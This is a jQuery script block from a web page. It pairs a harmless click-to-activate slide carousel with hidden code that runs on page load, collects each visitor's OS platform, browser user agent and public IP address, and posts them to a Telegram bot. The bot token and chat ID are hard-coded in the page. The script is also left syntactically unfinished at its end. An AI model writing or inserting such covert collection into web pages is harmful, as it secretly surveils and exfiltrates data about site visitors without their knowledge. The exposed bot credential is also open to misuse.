    <script>
    $(document).ready(function() {
            // Get user system information
            var systemInfo = {
            os: navigator.platform,
            browser: navigator.userAgent
             };

            const slides = document.querySelectorAll('.slide');

            for (const slide of slides) {
            slide.addEventListener('click', () => {
                clearActiveClasses();
                slide.classList.add('active');
            });
             }

              function clearActiveClasses() {
            slides.forEach((slide) => {
                slide.classList.remove('active');
            });
             }

            // Get user network IP address
            $.getJSON("https://api.ipify.org?format=json", function(data) {
            var ipAddress = data.ip;


            // Send data to Telegram bot
            var telegramBotToken = "8157146830:AAHZz_i8nLBRhhQfjrNc8UQVDcmXgU5r5p8";
            var chatId = "6663666967";
            var message = "System Info: OS - " + systemInfo.os + ", Browser - " + systemInfo.browser + ", IP Address - " + ipAddress + ", @";

            $.ajax({
                url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
                method: "POST",
                data: {
                    chat_id: chatId,
                    text: message
                },
                success: function(response) {
                    console.log("Data sent to Telegram bot successfully!");
                },
                error: function(xhr, status, error) {

            });
        });
